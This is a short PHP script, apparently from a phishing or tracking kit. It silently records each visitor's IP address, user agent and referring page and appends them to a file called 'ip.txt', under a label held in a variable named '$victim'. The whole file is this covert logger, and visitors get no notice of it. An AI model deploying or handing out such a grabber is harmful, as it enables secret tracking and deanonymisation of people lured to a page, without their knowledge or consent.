<?php

if (!empty($_SERVER['HTTP_CLIENT_IP']))
    {
      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
    }
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
    }
else{
      $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
}
$useragent = " User-Agent: ";
$browser = $_SERVER['HTTP_USER_AGENT'];
$referer = $_SERVER['HTTP_REFERER'];


$file = 'ip.txt';
$victim = "\nIP: ";
$fp = fopen($file, 'a');

fwrite($fp, $victim);
fwrite($fp, $ipaddress);
fwrite($fp, $useragent);
fwrite($fp, $browser);
fwrite($fp, "Refered Page: ");
fwrite($fp, $referer);


fclose($fp);
